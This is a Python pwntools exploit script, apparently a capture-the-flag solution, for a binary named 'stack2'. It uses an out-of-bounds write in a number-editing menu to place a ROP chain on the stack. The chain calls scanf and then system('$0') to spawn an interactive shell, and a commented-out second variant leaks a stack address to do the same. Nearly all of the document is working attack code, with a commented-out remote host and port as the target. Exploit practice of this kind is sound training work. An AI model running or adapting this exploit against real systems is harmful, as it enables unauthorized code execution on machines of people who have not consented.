from pwn import *

fpath = "./stack2"
# context.log_level = "debug"
offset = 0x70 + 0x14

p = process("./stack2")
# p =  remote("111.198.29.45" , 30754)
elf = ELF(fpath)

p.sendlineafter("have:" , "1")
p.sendlineafter("Give me your numbers\n" , "1")

bss   = elf.symbols["__bss_start"]
addr_d = 0x8048A97
scanf =  elf.plt["__isoc99_scanf"]
system = elf.plt["system"]
p2p_r    = 0x0804895a

def edit(idx , num):
	p.sendlineafter("exit\n" , "3")
	p.recvuntil(":")
	p.sendline(str(idx))
	p.recvuntil(":")
	p.sendline(str(num))

def edit_num(num , start_offset):
	num = p32(num)
	for i in range(4):
		edit(start_offset + i , ord(num[i]) )

# temp = "/bin/sh\x00"
# temp = "sh\x00"
temp = "$0"
for i in range(len(temp)):
	edit_num(scanf , offset + i * 0x10)
	edit_num(p2p_r , offset + 4 + i * 0x10)
	edit_num(addr_d , offset + 8 + i * 0x10)
	edit_num(bss + i , offset + 0xc + i * 0x10)
edit_num(system , offset  + len(temp) * 0x10 )
edit_num(0 , offset + len(temp) * 0x10 + 4)
edit_num(bss  , offset + len(temp) * 0x10 + 8)

p.recvuntil("exit\n")
# gdb.attach(p , "b *0x80488EE")
gdb.attach(p , "b *0x080488EB")
p.sendline("5")
for i in temp:
	p.sendline(str(ord(i)))

p.interactive()

# from pwn import *
# from LibcSearcher import LibcSearcher
# context.log_level = "debug"
# p = process("./stack2")
# elf = ELF("./stack2")

# shell = elf.sym["hackhere"]
# print(hex(shell))
# p.sendlineafter("you have:" , str(0x70))
# for i in range(100):
# 	p.sendline("+")

# p.sendlineafter("5. exit\n" , "1")
# for i in range(109):
# 	p.recvline()
# text = ""
# for i in range(4):
# 	temp = p.recvline()[:-1]
# 	temp = int(temp.split("\t\t")[1]) & 0xff
# 	text += chr(temp)
# stack_addr = u32(text)
# input_addr = stack_addr - 0x14 - 0x70 

# str_bin_sh = "$0\x00"
# #edit /bin/sh
# for i in range(len(str_bin_sh)):
# 	p.sendlineafter("5. exit\n" , "3")
# 	p.sendlineafter("which number to change:\n" , str(i))
# 	p.sendlineafter("new number:" , str(ord(str_bin_sh[i])))
# #edit payload
# payload = p32(elf.plt["system"]) + p32(0) + p32(input_addr - 4) 
# for i in range(len(payload)):
# 	p.sendlineafter("5. exit\n" , "3")
# 	p.sendlineafter("which number to change:\n" , str(0x70 + 4 + 0x10 + i))
# 	p.sendlineafter("new number:" , str(ord(payload[i])))
# #edit 
# # gdb.attach(p , "b *0x080488EB")
# p.sendlineafter("5. exit\n" , "5")

# p.interactive()